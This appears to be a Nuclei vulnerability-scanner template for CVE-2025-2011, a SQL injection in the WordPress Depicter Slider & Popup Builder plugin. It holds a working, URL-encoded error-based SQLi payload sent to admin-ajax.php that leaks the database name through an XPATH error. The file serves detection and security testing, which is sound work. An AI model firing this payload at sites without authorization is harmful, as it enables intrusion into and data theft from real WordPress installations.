id: cve-2025-2011
info:
  name: SQLi in Depicter Slider & Popup Builder <3.6.2
  author: bigbrooklyn
  severity: critical
  description: |
    This template checks for a SQL Injection vulnerability in Depicter Slider & Popup Builder versions below 3.6.2.
    The payload exploits a SQL injection vector in admin-ajax.php, using EXTRACTVALUE to extract database information.
  tags: sqli,wordpress,plugin

variables:
  payload: "test%25%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))=%27&perpage=20&page=1&orderBy=source_id&dateEnd=&dateStart=&order=DESC&sources=&action=depicter-lead-index"

http:
  - raw:
      - |
        GET /wp-admin/admin-ajax.php?s={{payload}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Nuclei
        Accept: */*
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: regex
        regex:
          - "XPATH syntax error: "
    extractors:
      - type: regex
        name: database_name
        regex:
          - "XPATH syntax error: "
        part: body
